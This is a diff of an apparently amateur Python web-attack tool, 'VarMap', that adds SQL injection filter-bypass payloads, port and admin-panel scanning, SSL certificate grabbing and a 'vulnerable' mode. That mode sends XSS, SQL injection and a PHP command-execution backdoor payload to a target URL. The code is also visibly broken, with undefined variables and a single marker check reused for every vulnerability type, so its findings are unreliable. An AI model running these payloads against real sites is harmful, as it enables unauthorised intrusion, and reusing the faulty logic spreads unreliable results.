@@ -1,3 +1,5 @@
+# Variable Mapping Tools - Exploiter Info Website
+# Version : 1.2.5
 import argparse
 import requests
 import socket
@@ -6,6 +8,7 @@ import hashlib
 import random
 import datetime
 import os
+import ssl
 from bs4 import BeautifulSoup
 
 def __banner__():
@@ -13,8 +16,8 @@ def __banner__():
 	time_now = date_time.strftime("[+] Starting %H:%M:%S /%Y:%m:%d")
 	print('''
                ___
- _____          H    3;) 100101001 
-|  |  |___ ___ [,] _____ ___ ___  {1.2}
+ _____          H    
+|  |  |___ ___ [,] _____ ___ ___  {1.2.5}
 |  |  | .'|  _|[)]|     | .'| . | {Pham Chien}
  \___/|__,|_|  [(]|_|_|_|__,|  _|
                 V           |_|   ghostmanews.blogspot.com 
@@ -25,16 +28,22 @@ def __banner__():
 	print("")
 def __session__():
 	argparsers = argparse.ArgumentParser(description="[!] VarMap Tool - Exploring Website Information VarMap V1.2")
-	argparsers.add_argument('--url', type=str, help='URL target (ex : https://test.com)')
-	argparsers.add_argument('--check', action='store_true', help='Checking target URL')
-	argparsers.add_argument('--version', action='store_true', help='Checking Version Target URL')
-	argparsers.add_argument('--propertie', action='store_true', help='Scanning ALL Propertie URL Target')
-	argparsers.add_argument('--infomation', action='store_true', help='Scanning ALL Infomation URL Target')
-	argparsers.add_argument('--filter', action='store_true', help='Scanning ALL Filter URL Target')
-	argparsers.add_argument('--meta', action='store_true', help='Checking Items META URL target')
-	argparsers.add_argument('--link', action='store_true', help='Checking Items LINKS URL target')
-	argparsers.add_argument('--script', action='store_true', help='Checking Items script URL target')
+	argparsers.add_argument('-u', '--url', type=str, help='URL target (ex : https://test.com)')
+	argparsers.add_argument('-c', '--check', action='store_true', help='Checking target URL')
+	argparsers.add_argument('-v', '--version', action='store_true', help='Checking Version Target URL')
+	argparsers.add_argument('-p', '--propertie', action='store_true', help='Scanning ALL Propertie URL Target')
+	argparsers.add_argument('-i', '--infomation', action='store_true', help='Scanning ALL Infomation URL Target')
+	argparsers.add_argument('-f', '--filter', action='store_true', help='Scanning ALL Filter URL Target')
+	argparsers.add_argument('-m', '--meta', action='store_true', help='Checking Items META URL target')
+	argparsers.add_argument('-l', '--link', action='store_true', help='Checking Items LINKS URL target')
+	argparsers.add_argument('-sr', '--script', action='store_true', help='Checking Items script URL target')
 	argparsers.add_argument('--sqlscan', action='store_true', help='Payload Scan Vulnerable SQL injection')
+	argparsers.add_argument('--sslcert', action='store_true', help='Scan SSL CERT')
+	argparsers.add_argument('--admin', action='store_true', help='scan admin login page')
+	argparsers.add_argument('-V', '--vulnerable', action='store_true', help='Testing ALL Vulnerable For URL target')
+	argparsers.add_argument('--portssl', type=int, help='set port ssl scanner')
+	
+	argparsers.add_argument('-d', '--dns', action='store_true', help='Scan DNS and PORT Server Target (ex python3 varmap.py --url (ex : http://test.com/) --check --dns')
 	argparsers.add_argument('--about', action='store_true', help='Show This About')
 
 	args = argparsers.parse_args()
@@ -74,7 +83,7 @@ def __session__():
 						print("ID : {}".format(id_code))
 						print("MD5 : {}".format(md5_url))
 						print("+--------------------------------+")
-						print("OUTPUT RECV : ")
+						
 						time.sleep(0.50)
 					__getid__()
 				__check__()
@@ -157,6 +166,15 @@ def __session__():
 									"/*/*/Union Select 1,2,3--",
 									"/*/*/Union Select 1,2,3,4,5,6--",
 									"/*/*/Union Select 1,2,3,4,5,6,7,8,9,10--",
+									"/**8**/and/**8**/mod(9,9)/**/",
+									"/**8**/",
+									"/**8**//%23%0a",
+									"*/%27",
+									"%250a",
+									"%25AAAAAAAAAAAAAAAAAAAA%0a",
+									"%23+++++++++++++++++++++%0a",
+									"--20-%0A",
+									"/**//*12345UNION+SELECT*/**/"
 								]
 								for payload_bypass in payloads:
 									response_output = requests.get(URL + payload_bypass)
@@ -228,7 +246,148 @@ def __session__():
 										exit()
 							__sql__()
 					_startpayload_()
-					
+
+			if args.sslcert:
+				PORT = args.portssl
+				if PORT:
+					def __remove_http__():
+						http_remove = URL.replace("http://", "").replace("https://", "")
+						urls = http_remove.split("://")
+						result = urls[-1]
+						remove_path = result.replace("/", "")
+						paths = remove_path.split("/")
+						URL_NEW = paths[-1]
+
+						time_checking = datetime.datetime.now()
+						starting_time = time_checking.strftime("%H:%M:%S")
+						script_context = ssl.create_default_context()
+						
+						with socket.create_connection((URL_NEW, PORT)) as sock:
+							with script_context.wrap_socket(sock, server_hostname=URL_NEW) as socks:
+								get_ssl = socks.getpeercert()
+
+						for keys_data, line_value in get_ssl.items():
+							print("[{}] [info] {} : {}".format(start_time, keys_data, line_value))
+							print("[{}] [info] {}".format(starting_time, script_context))
+							time_sleep = 0.20
+							time.sleep(time_sleep)
+					__remove_http__()
+				else:
+					print("[{}] [warning] Please Agian, You Not Set PORT ( ex : python3 varmap.py --url https://testurl.com --check --sslcert --portssl 443 )".format(now_time))
+					exit()
+
+			if args.dns:
+				def scan_dns():
+					http_remove = URL.replace("http://", "").replace("https://", "")
+					urls = http_remove.split("://")
+					result = urls[-1]
+					remove_path = result.replace("/", "")
+					paths = remove_path.split("/")
+					URL_NEW = paths[-1]
+					get_dns = socket.gethostbyname(URL_NEW)
+					print("[{}] [info] IP DNS : {}".format(now_time, get_dns))
+					def scan_port():
+						s = socket.socket(
+							socket.AF_INET,
+							socket.SOCK_STREAM
+						)
+						s.settimeout(2)
+						port = [
+							21,
+							22,
+							25,
+							80,
+							443,
+							8080,
+							2222,
+							995,
+							35500,
+							20,
+						]
+						for PORTS in port:
+							check_port = s.connect_ex((get_dns, PORTS))
+							try:
+								if check_port == 0:
+									print("[{}] [info] {} : {} => Status : Open".format(now_time, get_dns, PORTS))
+									time.sleep(0.20)
+								else:
+									print("[{}] [info] {} : {} => Status : Close".format(now_time, get_dns, PORTS))
+									time.sleep(0.20)
+							except socket.error:
+								print("error")
+						s.close()
+					scan_port()
+				scan_dns()
+
+			if args.admin:
+				def scanning_admin():
+					payloads_panel = [
+						'/admin',
+						'/cpanel',
+						'/login',
+						'/wp-admin',
+						'/wp-login',
+						'/admin/login.php',
+						'/login.php',
+						'/admin.php',
+					]
+					for check_admin in payloads_panel:
+						headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"}
+						responsed = requests.get(URL + check_admin, headers=headers)
+						if response.status_code == 200:
+							print("[{}] [info] status : {} [ your path => {} ]".format(now_time, responsed.status_code, check_admin))
+				scanning_admin()
+
+			if args.vulnerable:
+				def testing_vuln():
+					payload = [
+						# HTML Injection Vulnerable
+						"/*/<h1>Testing By VarMap</h1>",
+						# XSS Vulnerable
+						"/*/<script>document.body.innerHTML=('Testing By VarMap');</script>",
+						# SQL Injection Vulnerable
+						"/*/filter?category=Testing By VarMap' OR 1=1--",
+						# Backdoor PHP
+						"/*/<php? system(\$_GET['cmd']); ?>",
+					]
+
+					print(f"[{now_time}] [info] Starting Exploit 4 Vulnerable...")
+					time.sleep(1)
+					print(f"[{now_time}] [info] Random Agent...")
+					time.sleep(1)
+					for payloads in payload:
+						print(f"[{now_time}] [info] Random Payloading...")
+						time.sleep(0.20)
+						responsed = requests.get(URL + payloads)
+						if "Testing By VarMap" in responsed.text:
+							print(f"[{now_time}] [info] HTML Injection : vulnerable ")
+							time.sleep(0.30)
+						else:
+							print(f"[{now_time}] [info] HTML Injection : Not vulnerable")
+							time.sleep(0.20)
+
+						if "Testing By VarMap" in responsed.text:
+							print(f"[{now_time}] [info] XSS Injection : vulnerable ")
+							time.sleep(0.30)
+						else:
+							print(f"[{now_time}] [info] XSS Injection : Not vulnerable")
+							time.sleep(0.20)
+
+						if "Testing By VarMap" in responsed.text:
+							print(f"[{now_time}] [info] SQL Injection : vulnerable ")
+							time.sleep(0.30)
+						else:
+							print(f"[{now_time}] [info] SQL Injection : Not vulnerable")
+							time.sleep(0.20)
+
+						if "Testing By VarMap" in responsed.text:
+							print(f"[{now_time}] [info] PHP Backdoor : vulnerable ")
+							time.sleep(0.30)
+						else:
+							print(f"[{now_time}] [info] PHP Backdoor : Not vulnerable")
+							time.sleep(0.20)
+				testing_vuln()
+
 			else:
 				print("[warning] the target not response, please agian")
 				exit()
